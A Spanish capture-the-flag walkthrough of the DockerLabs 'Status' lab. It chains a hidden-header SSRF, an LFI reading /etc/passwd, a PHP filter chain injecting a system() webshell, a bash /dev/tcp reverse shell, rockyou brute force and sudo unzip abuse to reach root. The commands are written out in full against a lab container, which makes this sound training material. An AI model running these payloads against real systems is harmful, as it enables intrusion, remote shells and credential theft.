## Introducción

Este documento presenta la resolución completa de la máquina **Status**, desarrollada por *Pylon & El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un endpoint `/status.php` que oculta funcionalidad tras una cabecera HTTP personalizada (`Statusid: 1`). Esta cabecera revela una herramienta de verificación de estado que permite SSRF, descubriendo un servicio interno en el puerto 3222. A través de este servicio, se descarga un backup que contiene código fuente con una vulnerabilidad **LFI** en `file.php`, convertida a **RCE** mediante filtros de PHP.
Tras obtener una reverse shell como `www-data`, se realiza un ataque de fuerza bruta para acceder al usuario `baluton`. Finalmente, se abusa del permiso sudo en `unzip` para extraer un archivo ZIP con la contraseña de `root`, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Status.zip
sudo bash auto_deploy.sh Status.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Status/{content,exploits,nmap,scripts}
cd Status
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1766377581/Ports_lxayve.png)

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2
```

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Bypass mediante cabecera Statusid

Se envía la cabecera `Statusid: 1`:

```bash
curl -s -H "Statusid: 1" http://172.17.0.2/status.php
```

![Hidden](https://res.cloudinary.com/dewqswzke/image/upload/v1766377577/Hidden_ig1nqr.png)

### 2.2 Enumeración de puertos internos (SSRF)

```bash
seq 1 10000 | ffuf -w - \
  -u 'http://172.17.0.2/status.php' \
  -X POST \
  -H 'Statusid: 1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'url=http://localhost:FUZZ' \
  -fs 339
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1766377577/Ffuf_s4cgtz.png)

Se descubre el puerto 3222.

### 2.3 Descubrimiento de API interna

```bash
curl -s -H "Statusid: 1" \
  -d "url=http://localhost:3222" \
  http://172.17.0.2/status.php
```

![Output](https://res.cloudinary.com/dewqswzke/image/upload/v1766377577/Output_rrg1yw.png)

### 2.4 Descarga de backup

```bash
wget "http://172.17.0.2/061400ca5d384de48f37a71ec23cc518/backups/backup_5025a3123660d066c9ba8617c0cd92d5.zip"
unzip backup_5025a3123660d066c9ba8617c0cd92d5.zip
```

### 2.5 LFI en file.php

```bash
curl -s "http://172.17.0.2/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?72e22dffd7fa10883a85aa3e0bbbd6d4=/etc/passwd"
```

![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1766377577/Passwd_avji7h.png)

### 2.6 LFI → RCE con PHP filters

Se genera una cadena de filtros con `php_filter_chain_generator`:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

### 2.7 Reverse shell

Se inicia un listener:

```bash
nc -nlvp 443
```

Se ejecuta el payload:

```bash
curl -s "http://172.17.0.2/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?72e22dffd7fa10883a85aa3e0bbbd6d4=${CHAIN}&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27"
```

![Reverse](https://res.cloudinary.com/dewqswzke/image/upload/v1766377584/Reverse_jwe0mu.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → baluton

Se transfiere `UserRush` y `rockyou.txt` para fuerza bruta:

```bash
./UserRush.sh baluton
```

![Password](https://res.cloudinary.com/dewqswzke/image/upload/v1766377578/Password_erxaka.png)

```bash
su baluton
```

![Baluton](https://res.cloudinary.com/dewqswzke/image/upload/v1766377576/Baluton_hzq5p6.png)

### 3.2 De baluton → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1766377585/sudo-lBaluton_ticizo.png)

Se puede ejecutar `unzip` como root. Se encuentra el archivo `/secretitosecretazo.zip`:

```bash
sudo /usr/bin/unzip /secretitosecretazo.zip -d /tmp/secret_extraction
cat /tmp/secret_extraction/regalitoregalazoregalin.txt
```

![Regalito](https://res.cloudinary.com/dewqswzke/image/upload/v1766377581/Regalito_rdb7hy.png)

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1766377585/Root_vn4daf.png)
